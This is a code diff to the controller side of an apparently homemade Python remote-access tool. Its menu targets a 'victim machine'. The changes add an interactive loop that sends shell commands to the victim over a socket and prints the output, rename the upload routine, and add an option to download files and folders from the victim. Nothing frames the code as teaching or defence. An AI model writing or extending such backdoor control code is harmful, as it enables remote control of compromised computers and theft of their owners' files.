@@ -9,7 +9,8 @@ def showOptions():
     print("\n")
     print("\t\t 1. Run Command on victim machine")
     print("\t\t 2. Upload file")
-
+    print("\t\t 3. Download Files and folder from the victim machine")
+    
 
 def handleConnection(my_socket):
     print("[+] Handling Connection")
@@ -23,12 +24,16 @@ def handleConnection(my_socket):
         
         if user_input == "1":
             print("Running Commands:")
-            print(">>>" , end = " ")
-            command = input()
-            my_socket.send_data(command)
+            while(True):
+                print(">>>" , end = " ")
+                command = input()
+                if command == "##stop##":
+                    break
 
-            result = my_socket.recieve_data()
-            print(result)
+                my_socket.send_data(command)
+
+                result = my_socket.recieve_data()
+                print(result)
 
 
         elif user_input == '2':
@@ -41,7 +46,11 @@ def handleConnection(my_socket):
             my_socket.send_data(fname)
         
             
-            my_socket.send_file(file_path)
+            my_socket.upload_file(file_path)
+        elif user_input == "3":
+            print("Download files from the victim")
+            my_socket.download_file()
+            
 
         elif (user_input == "99"):
             break
